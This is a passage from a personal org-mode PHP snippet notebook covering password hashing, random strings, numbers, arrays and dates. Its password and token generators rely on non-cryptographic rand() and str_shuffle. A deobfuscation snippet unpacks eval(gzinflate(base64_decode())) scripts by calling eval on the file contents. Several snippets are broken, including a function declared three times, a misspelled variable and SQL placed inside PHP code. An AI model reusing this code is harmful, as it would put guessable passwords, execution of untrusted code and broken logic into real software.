   cause Unicode data to be stored incorrectly in your database, depending on
   your configuration.

 - Even if you declare your character set to be utf8mb4, make sure that your
   actual database tables are in the utf8mb4 character set. For why we use
   utf8mb4 instead of just utf8, check the PHP and UTF-8 section.

 - Enabling persistent connections can possibly lead to weird
   concurrency-related issues. This isn’t a PHP problem, it’s an app-level
   problem. Persistent connections are safe to use as long as you consider the
   consequences. See this Stack Overflow question.

 - You can execute more than one SQL statement in a single execute() call. Just
   separate the statements with semicolons. Ubuntu 12.04 (PHP <= 5.3.10): If
   doing this, beware of this bug, which isn’t fixed in the version of PHP
   shipped with Ubuntu 12.04.

** Storing passwords
Use the built-in password hashing functions to hash and compare passwords.

Hashing is the standard way of protecting a user’s password before it’s stored
in a database. Many common hashing algorithms like md5 and even sha1 are unsafe
for storing passwords, because hackers can easily crack passwords hashed using
those algorithms.

PHP provides a built-in password hashing library that uses the bcrypt algorithm,
currently considered the best algorithm for password hashing.

#+begin_src php 
<?php
// Hash the password.  $hashedPassword will be a 60-character string.
$hashedPassword = password_hash('my super cool password', PASSWORD_DEFAULT);
 
// You can now safely store the contents of $hashedPassword in your database!
 
// Check if a user has provided the correct password by comparing what they typed with our hash
password_verify('the wrong password', $hashedPassword); // false
 
password_verify('my super cool password', $hashedPassword); // true
?>
#+end_src 

 - Many sources will recommend that you also “salt” your password before hashing
   it. That’s a great idea, and password_hash() already salts your password for
   you. That means that you don’t have to salt it yourself.
** random string
#+begin_src php 
  function randString($l = 8) {
		  return substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, $l);
  }
  function shapeSpace_random_string($length) {

	  $characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";	

	  $strlength = strlen($characters);

	  $random = '';

	  for ($i = 0; $i < $length; $i++) {
		  $random .= $characters[rand(0, $strlength - 1)];
	  }

	  return $random;

  }

  function shapeSpace_random_string($length) {

	  $characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

	  $random = substr(str_shuffle($characters), 0, $length);

	  return $random;

  }

  // This technique is similar to the previous, but attempts to make the
  // alphanumeric string even more random by seeding the random number generator
  // with the srand() function.
function shapeSpace_random_string($length) {
	 
	$characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	
	srand((double)microtime()*1000000); 
	
	$random = '';
	
	for ($i = 0; $i < $length; $i++) {  
		$random .= $characters[rand() % strlen($characters)];  
	}
	
	return $random;
	  
}

#+end_src

** random human readable string
#+begin_src php
function shapeSpace_random_string_readable($length) {
	
	$c = array('b','c','d','f','g','h','j','k','l','m','n','p','r','s','t','v','w','x','y','z');
	
	$v = array('a','e','i','o','u');
	
	srand((double)microtime()*1000000);
	
	$max = $length / 2;
	
	$random = '';
	
	for ($i = 1; $i <= $max; $i++) {
		$random .= $c[rand(0,19)];
		$random .= $v[rand(0,4)];
	}
	
	return $random; 
	 
}
#+end_src

** Random password strings
#+begin_src php
function generatePassword($length=9, $strength=0) {
    $vowels = 'aeuy';
    $consonants = 'bdghjmnpqrstvz';
    if ($strength & 1) {
        $consonants .= 'BDGHJLMNPQRSTVWXZ';
    }
    if ($strength & 2) {
        $vowels .= "AEUY";
    }
    if ($strength & 4) {
        $consonants .= '23456789';
    }
    if ($strength & 8) {
        $consonants .= '@#$%';
    }
 
    $password = '';
    $alt = time() % 2;
    for ($i = 0; $i < $length; $i++) {
        if ($alt == 1) {
            $password .= $consonants[(rand() % strlen($consonants))];
            $alt = 0;
        } else {
            $password .= $vowels[(rand() % strlen($vowels))];
            $alt = 1;
        }
    }
    return $password;
}
#+end_src

** Generate random UUID
#+begin_src php 
/**
 * Generate a random UUID (version 4).
 *
 * @since 4.7.0
 *
 * @return string UUID.
 */
function wp_generate_uuid4() {
	return sprintf( '%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
		mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff ),
		mt_rand( 0, 0xffff ),
		mt_rand( 0, 0x0fff ) | 0x4000,
		mt_rand( 0, 0x3fff ) | 0x8000,
		mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff )
	);
}
#+end_src

** strpos of the first digit
#+begin_src php
function digpos($str) {
  $pat = '(\d+)';
  preg_match($pat,$str,$matches);
  return(array($matches[0],strpos($str,$matches[0])));
}
$tests = array('sdfj234skdfl;s','this 1s a test','xxxx');
foreach ($tests as $str) {
   list($matstr,$matpos) = digpos($str);
   if ($matpos !== false) {
      echo "The digits [$matstr] were found at position [$matpos] in the string [$str]<br>\n";
   } else {
      echo "No digits were found in the string [$str]<br>\n";
   }
}
#+end_src

** alpabet ordinal value from 1(a->1, b->2, ...)
#+begin_src php
function alpha_ord($in)
{
	return ord(strtoupper($in)) - 64;
}
//reverse 1->a 2->b ...
function ord_to_alpha($in)
{
	$alpha = "abcdefghijklmnopqrstuvwxyz";
	for($i = 0; $i < strlen($alpha); $i++)
	{
		if($in == alpha_ord($alpha[$i]))
		{
			return $alpha[$i];
		}
	}
	return "";
}
#+end_src

* numbers
** Checking Whether a Variable Contains a Valid Number
   
#+begin_src php
<?php
if (is_numeric(5))          { /* true  */ }
if (is_numeric('5'))        { /* true  */ }
if (is_numeric("05"))       { /* true  */ }
if (is_numeric('five'))     { /* false */ }

if (is_numeric(0xDECAFBAD)) { /* true  */ }
if (is_numeric("10e200"))   { /* true  */ }
?>
#+end_src

** comparing floating point numbers

Use a small delta value, and check if the numbers have a difference smaller than that delta:

#+begin_src php
<?php
$delta = 0.00001;

$a = 1.00000001;
$b = 1.00000000;

if (abs($a - $b) < $delta) { /* $a and $b are equal */ }
?>
#+end_src


Floating-point numbers are represented in binary form with only a
finite number of bits for the mantissa and the exponent. You get
overflows when you exceed those bits. As a result, sometimes PHP (just
like some other languages) doesn’t believe that two equal numbers are
actually equal because they may differ toward the very end.

To avoid this problem, instead of checking if $a == $b, make sure the
first number is within a very small amount ($delta) of the second
one. The size of your delta should be the smallest amount of
difference you care about between two numbers. Then use abs() to get
the absolute value of the difference.
** Rounding Floating-Point Numbers

To round a number to the closest integer, use round() :

$number = round(2.4);   // $number = 2

To round up, use ceil() :

$number = ceil(2.4);    // $number = 3

To round down, use floor() :

$number = floor(2.4);   // $number = 2

To keep a set number of digits after the decimal point, round()
accepts an optional precision argument. For example, perhaps you are
calculating thetotal price for the items in a user’s shopping cart:

#+begin_src php
<?php
$cart = 54.23;
$tax = $cart * .05;
$total = $cart + $tax;       // $total = 56.9415

$final = round($total, 2);   // $final = 56.94
?>
#+end_src

** Converting between bases
Use the base_convert() function:
#+begin_src php
$hex = 'a1';                           // hexadecimal number (base 16)

// convert from base 16 to base 10
$decimal = base_convert($hex, 16, 10); // $decimal is now 161
#+end_src 

The base_convert() function changes a string in one base to the
correct string in another. It works for all bases from 2 to 36
inclusive, using the letters a through z as additional symbols for
bases above 10. The first argument is the number to be converted,
followed by the base it is in and the base you want it to become.

There are also a few specialized functions for conversions to and from
base 10 and the most commonly used other bases of 2, 8,
and 16. They’re bindec() and decbin(), octdec() and decoct(), and
hexdec() and dechex() :

#+begin_src php
// convert to base 10
print bindec(11011); // 27
print octdec(33);    // 27
print hexdec('1b');  // 27

// convert from base 10
print decbin(27);    // 11011
print decoct(27);    // 33
print dechex(27);    // 1b
#+end_src 

Another alternative is to use printf(), which allows you to convert
decimal numbers to binary, octal, and hexadecimal numbers with a wide
range of formatting, such as leading zeros and a choice between upper-
and lowercase letters for hexadecimal numbers.

For instance, say you want to print out HTML color values:
#+begin_src php
printf('#%02X%02X%02X', 0, 102, 204); // #0066CC
#+end_src 

** Rounded random numbers
#+begin_src php
$foo = ROUND(RAND(1, 1000));
#+end_src

** Weighted Random Choice
#+begin_src php
<?PHP
 
// Give higher priorities to the users who pay the most.
// Gives lowest-priced rows the highest priority:
 
SELECT * FROM LINK ORDER BY RAND()*payPerClick/RAND();
 
 
// Gives highest-priced rows the highest priority
 
SELECT 'field' FROM 'table' WHERE 'ppc' > 0 ORDER BY RAND() / 'ppc' * RAND()
 
// Running the query above 6000 times produces:
// 3 cent: 402
// 4 cent: 517
// 5 cent: 615
// 7 cent: 800
// 9 cent: 1020
// 11 cent: 1214
// 13 cent: 1432
 
 
// OR
 
FUNCTION w_rand($weights) {
    $r = MT_RAND(1,1000);
    $offset = 0;
    FOREACH ($weights AS $k => $w) {
        $offset += $w*1000;
        IF ($r <= $offset) {
            RETURN $k;
        }
    }
} 
 
?>
#+end_src

** Base 64 Decode
Description: I recently ran across a freeware web application written in PHP
that utilized the following method to encrypt its source code. You can decode
the encoded script with this PHP snippet.

#+begin_src php
<?PHP 
 
// sample is encoded like this:
// eval(gzinflate(base64_decode('encoded text'))); 
 
 
ECHO "\nDECODE nested eval(gzinflate()) by DEBO Jurgen <jurgen@person.be>\n\n";
ECHO "1. Reading coded.txt\n";
$fp1 = FOPEN ("coded.txt", "r");
$contents = FREAD ($fp1, FILESIZE ("coded.txt"));
FCLOSE($fp1);
ECHO "2. Decoding\n";
WHILE (PREG_MATCH("/eval\(gzinflate/",$contents)) {
  $contents=PREG_REPLACE("/< \?|\?>/", "", $contents);
  EVAL(PREG_REPLACE("/eval/", "\$contents=", $contents));
}
ECHO "3. Writing decoded.txt\n";
$fp2 = FOPEN("decoded.txt","w");
FWRITE($fp2, TRIM($contents));
FCLOSE($fp2);
 
/*
1.) Save the code you wish to decode in coded.txt
2.) Save the above PHP snippet in file like decrypt.php
3.) Create an empty text file called decoded.txt and it CHMOD it to 0666.
4.) Run decrypt.php and open up decoded.txt to view the source code.
*/
 
?>
#+end_src

** Bad word filter
   
#+begin_src php
<?
 
// BadWordFilter
// This function does all the work. If $replace is 1 it will replace all bad words
// with the wildcard replacements.  If $replace is 0 it will not replace anything.
// In either case, it will return 1 if it found bad words or 0 otherwise.
// Be sure to fill the $bads array with the bad words you want filtered.
 
FUNCTION BadWordFilter(&$text, $replace){
 
     // fill this array with the bad words you want to filter and their replacements
     $bads = ARRAY (
          ARRAY("butt","b***"),
          ARRAY("poop","p***"),
          ARRAY("crap","c***")
     );
 
     IF($replace==1) {                                        //we are replacing
          $remember = $text;
 
          FOR($i=0;$i<sizeof($bads);$i++) {               //go through each bad word
               $text = EREGI_REPLACE($bads[$i][0],$bads[$i][1],$text); //replace it
          }
 
          IF($remember!=$text) RETURN 1;                     //if there are any changes, return 1
 
     } ELSE {                                                  //we are just checking
 
          FOR($i=0;$i<sizeof($bads);$i++) {               //go through each bad word
               IF(EREGI($bads[$i][0],$text)) RETURN 1; //if we find any, return 1
          }     
     }
}
 
// this will replace all bad words with their replacements. $any is 1 if it found any
$any = BadWordFilter($wordsToFilter,1); 
 
// this will not repace any bad words. $any is 1 if it found any
$any = BadWordFilter($wordsToFilter,0); 
 
?>
#+end_src

** Ordinalize (Suffix) Numbers

#+begin_src php
<?PHP
 
FUNCTION ordinalize($number) {
 
  IF (IN_ARRAY(($number % 100),RANGE(11,13))){
      RETURN $number.'th';
  }ELSE{
      SWITCH (($number % 10)) {
        CASE 1:
            RETURN $number.'st';
        BREAK;
            CASE 2:
            RETURN $number.'nd';
        BREAK;
        CASE 3:
            RETURN $number.'rd';
        DEFAULT:
            RETURN $number.'th';
        BREAK;
      }
    }
}
?>
#+end_src

* arrays
** check for empty array

#+begin_src php
empty([]) // true
#+end_src

** testing for presence of a key
#+begin_src php
if (isset($hash[$key]))
  ; // entry exists  
else
  ; // no such entry 

// ------------

// Returns TRUE on all existing entries regardless of attached value
if (array_key_exists($key, $hash))
  ; // entry exists  
else
  ; // no such entry 
#+end_src

** Deleting from a array
#+begin_src php

// Remove one, or more, hash entries
unset($hash[$key]);

unset($hash[$key1], $hash[$key2], $hash[$key3]);

// Remove entire hash
unset($hash);
#+end_src 

** Traversing a Hash
#+begin_src php 
// Access keys and values
foreach($hash as $key => $value)
{
  ; // ...
}

// Access keys only
foreach(array_keys($hash) as $key)
{
  ; // ...
}

// Access values only
foreach($hash as $value)
{
  ; // ...
}
#+end_src

** Inverting a array
#+begin_src php 
// PHP offers the 'array_flip' function to perform the task of exchanging the keys / values
// of a hash i.e. invert or 'flip' a hash

$reverse = array_flip($hash);
#+end_src

** sorting array
#+begin_src php 
// PHP implements a swag of sorting functions, most designed to work with numerically-indexed
// arrays. For sorting hashes, the 'key' sorting functions are required:
// * 'ksort', 'krsort', 'uksort'

// Ascending order
ksort($hash);

// Descending order [i.e. reverse sort]
krsort($hash);

// Comparator-based sort

function comparator($left, $right)
{
  // Compare left key with right key
  return $left > $right;
}

uksort($hash, 'comparator');
#+end_src

** merging arrays
#+begin_src php 
// PHP offers the 'array_merge' function for this task [a related function, 'array_combine',
// may be used to create a hash from an array of keys, and one of values, respectively]

// Merge two, or more, arrays
$merged = array_merge($a, $b, $c);

// Create a hash from array of keys, and of values, respectively
$hash = array_combine($keys, $values);
#+end_src

** Finding Common or Different Keys in Two Hashes
#+begin_src php 
// PHP offers a number of array-based 'set operation' functions:
// * union:        array_merge
// * intersection: array_intersect and family
// * difference:   array_diff and family
// which may be used for this type of task

// Keys occurring in both hashes
$common = array_intersect_key($h1, $h2);

// Keys occurring in the first hash [left side], but not in the second hash
$this_not_that = array_diff_key($h1, $h2);
#+end_src 

** Hashing References
#+begin_src php 
// PHP implements a special type known as a 'resource' that encompasses things like file handles,
// sockets, database connections, and many others. The 'resource' type is, essentially, a
// reference variable that is not readily serialisable. That is to say:
// * A 'resource' may be converted to a string representation via the 'var_export' function
// * That same string cannot be converted back into a 'resource'
// So, in terms of array handling, 'resource' types may be stored as array reference values,
// but cannot be used as keys. 
//
// I suspect it is this type of problem that the Perl::Tie package helps resolve. However, since
// PHP doesn't, AFAIK, sport a similar facility, the examples in this section cannot be
// implemented using file handles as keys

$filenames = array('/etc/termcap', '/vmlinux', '/bin/cat');

foreach($filenames as $filename)
{
  if (!($fh = fopen($filename, 'r'))) continue;

  // Cannot do this as required by the Perl code:
  // $name[$fh] = $filename;

  // Ok
  $name[$filename] = $fh;
}

// Would traverse array via:
//
// foreach(array_keys($name) as $fh)
// ...
// or
//
// foreach($name as $fh => $filename)
// ...
// but since '$fh' cannot be a key, either of these will work:
//
// foreach($name as $filename => $fh)
// or
foreach(array_values($name) as $fh)
{
  fclose($fh);
}
#+end_src 

** Retrieving from a Hash in Insertion Order
#+begin_src php
// Unless sorted, hash elements remain in the order of insertion. If care is taken to
// always add a new element to the end of the hash, then element order is the order
// of insertion. The following function, 'array_push_associative' [modified from original
// found at 'array_push' section of PHP documentation], does just that
function array_push_associative(&$arr)
{
  foreach (func_get_args() as $arg)
  {
    if (is_array($arg))
      foreach ($arg as $key => $value) { $arr[$key] = $value; $ret++; }
    else
      $arr[$arg] = '';
  }

  return $ret;
}

// ------------

$food_colour = array();

// Individual calls, or ...
array_push_associative($food_colour, array('Banana' => 'Yellow'));
array_push_associative($food_colour, array('Apple' => 'Green'));
array_push_associative($food_colour, array('Lemon' => 'Yellow'));
#+end_src 
 
** sum of items in an array

#+begin_src php
$scores  = array(98, 76, 56, 80);
$total   = array_sum($scores);    // $total = 310
#+end_src

** Specifying an Array Not Beginning at Element 0
Instruct array() to use a different index using the => syntax:
#+begin_src php

$residents = array(1 => 'Washington', 'Adams', 'Jefferson', 'Madison');

foreach ($presidents as $number => $president) {
    print "$number: $president\n";
}
#+end_src

** Storing Multiple Elements Per Key in an Array

Store the multiple elements in an array:

#+begin_src php
$fruits = array('red' => array('strawberry','apple'),
                'yellow' => array('banana'));
#+end_src
 
Or use an object:

#+begin_src php
while ($obj = mysql_fetch_object($r)) {
    $fruits[] = $obj;
}
#+end_src

In PHP, keys are unique per array, so you can’t associate more than
one entry in a key without overwriting the old value. Instead, store
your values in an anonymous array:
#+begin_src php
$fruits['red'][] = 'strawberry';
$fruits['red'][] = 'apple';
$fruits['yellow'][] = 'banana';
#+end_src
 
Or, if you’re processing items in a loop:

#+begin_src php

while (list($color,$fruit) = mysql_fetch_array($r)) {
    $fruits[$color][] = $fruit;
}

#+end_src

To print the entries, loop through the array:

#+begin_src php
foreach ($fruits as $color=>$color_fruit) {
    // $color_fruit is an array
    foreach ($color_fruit as $fruit) {
        print "$fruit is colored $color.<br>";
    }
}
#+end_src

** Initializing an Array to a Range of Integers
#+begin_src php
range($start, $stop):
$cards = range(1, 52);
#+end_src 

** Iterating through an array
Use foreach:

#+begin_src php 
foreach ($array as $value) {
    // Act on $value
}

#Or to get an array’s keys and values:

foreach ($array as $key => $value) {
    // Act II
}

#Another technique is to use for:

for ($key = 0, $size = count($array); $key < $size; $key++) {
   // Act III
}

#Finally, you can use each() in combination with list() and while:

reset($array) // reset internal pointer to beginning of array
while (list($key, $value) = each ($array)) {
    // Final Act
}
#+end_src 

** Deleting elements from an array
To delete one element, use unset():
#+begin_src php
unset($array[3]);
unset($array['foo']);
#+end_src 
To delete multiple noncontiguous elements, also use unset():
#+begin_src php
unset($array[3], $array[5]);
unset($array['foo'], $array['bar']);
#+end_src 
To delete multiple contiguous elements, use array_splice():
#+begin_src php
array_splice($array, $offset, $length);
#+end_src 

** Changing array size

Use array_pad() to make an array grow:

#+begin_src php 

// start at three
$array = array('apple', 'banana', 'coconut');

// grow to five
$array = array_pad($array, 5, '');

//Now, count($array) is 5, and the last two elements, $array[3] and $array[4], contain the empty string.
//To reduce an array, you can use array_splice():

// no assignment to $array
array_splice($array, 2);

// This removes all but the first two elements from $array.
#+end_src 

** Check if array is associative
#+begin_src php
<?PHP
function is_assoc_array($array){
    if(is_array($array) && !is_numeric(array_shifT(array_keys($array)))){
        return true;
    }
    return false;
}
//another one from Limesurvay
function isAssociative($array)
{
  foreach($array as $key => $value)
  {
    if ( is_string($key))
    {
      return true;
    }
  }
  return false;
}

?>
#+end_src 

** Pick Randomly from Array
#+begin_src php
 <?PHP
 
// This method only works where the elements exist AND are 
// sequentially numbered. If you unset() elements from the 
// array, you may end up picking elements that no longer exist. 
 
$quote = $quotes_array[RAND(0, COUNT($quotes_array) - 1)]; 
 
?>
#+end_src

** Determine if the variable is a numeric-indexed array.
#+begin_src php 
 /*
 * @param mixed $data Variable to check.
 * @return bool Whether the variable is a list.
 */
function wp_is_numeric_array( $data ) {
	if ( ! is_array( $data ) ) {
		return false;
	}

	$keys = array_keys( $data );
	$string_keys = array_filter( $keys, 'is_string' );
	return count( $string_keys ) === 0;
}
#+end_src 

** ARRAY KEY WHITELIST AND BLACKLIST
#+begin_src php
function whitelist(array $array, array $whitelist)
{
    return array_intersect_key($array, array_flip($whitelist));
}

$filtered = whitelist($array, ['good1', 'good2', ... ]);
function blacklist(array $array, array $blacklist)
{
    return array_diff_key($array, array_flip($blacklist));
}

$filtered = blacklist($array, ['bad1', 'bad2', ...]);
#+end_src

** get random numbers from array
#+begin_src php
function shapeSpace_get_random_items($length) {
	
	$items = array(
		'item 1',
		'item 2',
		'item 3',
		'item 4',
		'item 5',
		'item 6',
		'item 7',
		'item 8',
	);
	
	$n = array(1, 2, 3, 4, 5, 6, 7, 8);
	
	srand((double)microtime()*1000000);
	
	$rand = array_rand($n, $length);
	
	sort($rand);
	
	$random = '';
	
	foreach ($rand as $r) $random = $items[$r] .' ';
	
	return $random;
	
}
#+end_src

** printing a list with commas
#+begin_src php
function commify_series($list)
{
  $n = str_word_count($list); $series = str_word_count($list, 1);

  if ($n == 0) return NULL;
  if ($n == 1) return $series[0];
  if ($n == 2) return $series[0] . ' and ' . $series[1];
  
  return join(', ', array_slice($series, 0, -1)) . ', and ' . $series[$n - 1];
}

// ------------

echo commify_series('red') . "\n";
echo commify_series('red yellow') . "\n";
echo commify_series('red yellow green') . "\n";

$mylist = 'red yellow green';
echo 'I have ' . commify_series($mylist) . " marbles.\n";

#+end_src

function commify_series($list)
{
  $n = str_word_count($list); $series = str_word_count($list, 1);

  if ($n == 0) return NULL;
  if ($n == 1) return $series[0];
  if ($n == 2) return $series[0] . ' and ' . $series[1];
  
  return join(', ', array_slice($series, 0, -1)) . ', and ' . $series[$n - 1];
}

// ------------

echo commify_series('red') . "\n";
echo commify_series('red yellow') . "\n";
echo commify_series('red yellow green') . "\n";

$mylist = 'red yellow green';
echo 'I have ' . commify_series($mylist) . " marbles.\n";

** Iterating Over an Array by Reference
#+begin_src php
// Conventional 'read-only' access
foreach($array as $item)
{
  ; // Can access, but not update, array element referred to by '$item'
}

// ----

// '&' makes '$item' a reference
foreach($array as &$item)
{
  ; // Update array element referred to by '$item'
}

// ------------

$arraylen = count($array);

for($i = 0; $i < $arraylen; $i++)
{
  ; // '$array' is updateable via subscript notation
}
#+end_src 

** Computing Union, Intersection, or Difference of Unique Lists
#+begin_src php 
// PHP offers a number of array-based 'set operation' functions:
// * union:        array_unique(array_merge(...))
// * intersection: array_intersect and family
// * difference:   array_diff and family
// which may be used for this type of task. Also, if returned arrays need to be
// reindexed, 'array_slice($array, 0)', or 'array_values($array)' are useful

$a = array(1, 3, 5, 6, 7, 8);
$b = array(2, 3, 5, 7, 9);

$union = array_values(array_unique(array_merge($a, $b))); // 1, 2, 3, 5, 6, 7, 8, 9
$isect = array_values(array_intersect($a, $b));           // 3, 5, 7
$diff = array_values(array_diff($a, $b));                 // 1, 8
#+end_src 

** Processing Multiple Elements of an Array
#+begin_src php 
// Array elements can be deleted using 'unset'; removing several elements would require applying
// 'unset' several times, probably in a loop. However, they would most likely also need to be
// reindexed, so a better approach would be to use 'array_slice' which avoids explicit looping.
// Where elements need to be removed, and those elements also returned, it is probably best to
// combine both operations in a function. This is the approach taken here in implementing both
// 'shiftN' and 'popN', and it is these functions that are used in the examples

function popN(&$arr, $n)
{
  $ret = array_slice($arr, -($n), $n);
  $arr = array_slice($arr, 0, count($arr) - $n);
  return $ret;
}

function shiftN(&$arr, $n)
{
  $ret = array_slice($arr, 0, $n);
  $arr = array_slice($arr, $n);
  return $ret;
}

// ------------

// Remove $n elements from the front of $array; return them in $fron
$front = shiftN($array, $n);

// Remove $n elements from the end of $array; return them in $end
$end = popN($array, $n);

// ------------
#+end_src

** Sorting an Array Numerically

// PHP offers a rich set of sorting functions. Key features:
// * Inplace sorts; the original array, not a a copy, is sorted
// * Separate functions exist for sorting [both ascending and descending order]:
//   - By value, assign new keys / indices [sort, rsort]
//   - By key   [ksort, krsort] (for non-numerically indexed arrays)
//   - By value [asort, arsort]
//   - As above, but using a user-defined comparator [i.e. callback function]
//     [usort, uasort, uksort]
//   - Natural order sort [natsort]
// * Significantly, if sorting digit-only elements, whether strings or numbers,
//   'natural order' [i.e. 1 before 10 before 100 (ascending)] is retained. If
//   the elements are alphanumeric e.g. 'z1', 'z10' then 'natsort' should be
//   used [note: beware of 'natsort' with negative numbers; prefer 'sort' or 'asort']

$unsorted = array(7, 12, -13, 2, 100, 5, 1, -2, 23, 3, 6, 4);

sort($unsorted);                 // -13, -2, 1, 2, 3, 4, 5, 6, 7, 12, 23, 100
rsort($unsorted);                // 100, 23, 12, 7, 6, 5, 4, 3, 2, 1, -2, -13

asort($unsorted);                // -13, -2, 1, 2, 3, 4, 5, 6, 7, 12, 23, 100
arsort($unsorted);               // 100, 23, 12, 7, 6, 5, 4, 3, 2, 1, -2, -13

natsort($unsorted);              // -2, -13, 1, 2, 3, 4, 5, 6, 7, 12, 23, 100

// ------------

function ascend($left, $right) { return $left > $right; }
function descend($left, $right) { return $left < $right; }

// ------------

usort($unsorted, 'ascend');      // -13, -2, 1, 2, 3, 4, 5, 6, 7, 12, 23, 100
usort($unsorted, 'descend');     // 100, 23, 12, 7, 6, 5, 4, 3, 2, 1, -2, -13

uasort($unsorted, 'ascend');     // -13, -2, 1, 2, 3, 4, 5, 6, 7, 12, 23, 100
uasort($unsorted, 'descend');    // 100, 23, 12, 7, 6, 5, 4, 3, 2, 1, -2, -13

// ----------------------------

function kill_process($pid)
{
  // Is 'killable' ?
  if (!posix_kill($pid, 0)) return;

  // Ok, so kill in two stages
  posix_kill($pid, 15); // SIGTERM
  sleep(1);
  posix_kill($pid, 9);  // SIGKILL
}

function pid($pentry)
{
  $p = preg_split('/\s/', trim($pentry));
  return $p[0];
}

$processes = array_map('pid', array_slice(preg_split('/\n/', `ps ax`), 1, -1));
sort($processes);

echo join(' ,', $processes) . "\n";

echo 'Enter a pid to kill: ';
if (($pid = trim(fgets(STDIN))))
  kill_process($pid);

** Implementing a Circular List
#+begin_src php
array_unshift($a1, array_pop($a1));  // last -> first
array_push($a1, array_shift($a1));   // first -> last

// ----------------------------

function grab_and_rotate(&$arr)
{
  $item = $arr[0];
  array_push($arr, array_shift($arr));
  return $item;
}

// ------------

$processes = array(1, 2, 3, 4, 5);

while (TRUE)
{
  $process = grab_and_rotate($processes);
  echo "Handling process {$process}\n";
  sleep(1);
}
#+end_src

** Randomizing an Array
#+begin_src php 
// PHP offers the 'shuffle' function to perform this task

$arr = array(1, 2, 3, 4, 5, 6, 7, 8, 9);

shuffle($arr);

echo join(' ', $arr) . "\n";

// ----------------------------

// Perl example equivalents
function fisher_yates_shuffle(&$a)
{
  $size = count($a) - 1;

  for($i = $size; $i >= 0; $i--)
  {
    if (($j = rand(0, $i)) != $i)
      list($a[$i], $a[$j]) = array($a[$j], $a[$i]);
  }
}

function naive_shuffle(&$a)
{
  $size = count($a);

  for($i = 0; $i < $size; $i++)
  {
    $j = rand(0, $size - 1);
    list($a[$i], $a[$j]) = array($a[$j], $a[$i]);
  }
}

// ------------

$arr = array(1, 2, 3, 4, 5, 6, 7, 8, 9);

fisher_yates_shuffle($arr);
echo join(' ', $arr) . "\n";

naive_shuffle($arr);
echo join(' ', $arr) . "\n";
#+end_src

** recursive in array
#+begin_src php
 function recursive_in_array($needle, $haystack)
{
    foreach ($haystack as $stalk) {
        if ($needle == $stalk || (is_array($stalk) && recursive_in_array($needle, $stalk))) {
            return true;
        }
    }
    return false;
}
#+end_src

* Date and Time
** Finding the Current Date and Time
Use strftime() or date() for a formatted time string, as in Example 3-2.

*Example 3-2. Finding the current date and time*
#+begin_src php
<?php
print strftime('%c');
print "\n";
print date('r');
?>
#+end_src
 
Example 3-2 prints:
#+begin_src 
Wed May 10 18:29:59 2006
Wed, 10 May 2006 18:29:59 -0400
#+end_src
 
*Use getdate() or localtime() if you want time parts.*
Example 3-3 shows how these functions work.

Example 3-3. Finding time parts
#+begin_src php
<?php
$now_1 = getdate();
$now_2 = localtime();
print "{$now_1['hours']}:{$now_1['minutes']}:{$now_1['seconds']}\n";
print "$now_2[2]:$now_2[1]:$now_2[0]";
#+end_src
 
Example 3-3 prints:
#+begin_src 
18:23:45
18:23:45
#+end_src
 
*Example 3-4 shows how to use getdate() to print out the month, day, and year.*

Example 3-4. Finding the month, day, and year
#+begin_src php
<?php
$a = getdate();
printf('%s %d, %d',$a['month'],$a['mday'],$a['year']);
?>
#+end_src
 
Example 3-4 prints:
#+begin_src 
May 5, 2007
#+end_src
 
Pass getdate() an epoch timestamp as an argument to make the returned
array the appropriate values for local time at that timestamp. The
month, day, and year at epoch timestamp 163727100 is shown in Example
3-5.

Example 3-5. getdate() with a specific timestamp
#+begin_src php
<?php
$a = getdate(163727100);
printf('%s %d, %d',$a['month'],$a['mday'],$a['year']);
?>
#+end_src
 
Example 3-5 prints:
#+begin_src 
March 10, 1975
#+end_src
 
The function localtime() returns an array of time and date parts. It
also takes an epoch timestamp as an optional first argument, as well
as a boolean as an optional second argument. If that second argument
is true, localtime() returns an associative array instead of a
numerically indexed array. The keys of that array are the same as the
members of the tm_struct structure that the C function localtime()
returns, as shown in Table 3-2.

*Example 3-6 shows how to use localtime() to print out today’s date in month/day/year format.*

Example 3-6. Using localtime()
#+begin_src php
<?php
$a = localtime();
$a[4] += 1;
$a[5] += 1900;
print "$a[4]/$a[3]/$a[5]";
#+end_src
 
Example 3-6 prints:
#+begin_src 
6/23/2006
#+end_src
 
The month is incremented by 1 before printing since localtime() starts
counting months with 0 for January, but we want to display 1 if the
current month is January. Similarly, the year is incremented by 1900
because localtime() starts counting years with 0 for 1900.

** Converting Time and Date Parts to an Epoch Timestamp

Use mktime() if your time and date parts are in the local time zone,
as shown in Example 3-7.

Example 3-7. Getting a specific epoch timestamp
#+begin_src php
<?php
// 7:45:03 PM on March 10, 1975, local time
$then = mktime(19,45,3,3,10,1975);
?>
#+end_src
 
Use gmmktime() , as in Example 3-8, if your time and date parts are in
GMT.

Example 3-8. Getting a specific GMT-based epoch timestamp
#+begin_src php
<?php
// 7:45:03 PM on March 10, 1975, in GMT
$then = gmmktime(19,45,3,3,10,1975);
?>
#+end_src
 
** Converting an Epoch Timestamp to Time and Date Parts
Pass an epoch timestamp to getdate(): $time_parts = getdate(163727100);.
** Finding the Difference of Two Dates
Convert both dates to epoch timestamps and subtract one from the
other. Example 3-13 separates the difference into weeks, days, hours,
minutes, and seconds.

Example 3-13. Calculating the difference between two dates
#+begin_src php
<?php
// 7:32:56 pm on May 10, 1965
$epoch_1 = mktime(19,32,56,5,10,1965);
// 4:29:11 am on November 20, 1962
$epoch_2 = mktime(4,29,11,11,20,1962);

$diff_seconds  = $epoch_1 - $epoch_2;
$diff_weeks    = floor($diff_seconds/604800);
$diff_seconds -= $diff_weeks   * 604800;
$diff_days     = floor($diff_seconds/86400);
$diff_seconds -= $diff_days    * 86400;
$diff_hours    = floor($diff_seconds/3600);
$diff_seconds -= $diff_hours   * 3600;
$diff_minutes  = floor($diff_seconds/60);
$diff_seconds -= $diff_minutes * 60;

print "The two dates have $diff_weeks weeks, $diff_days days, ";
print "$diff_hours hours, $diff_minutes minutes, and $diff_seconds ";
print "seconds elapsed between them.";
?>
#+end_src

Example 3-13 prints:

The two dates have 128 weeks, 6 days, 14 hours, 3 minutes, 
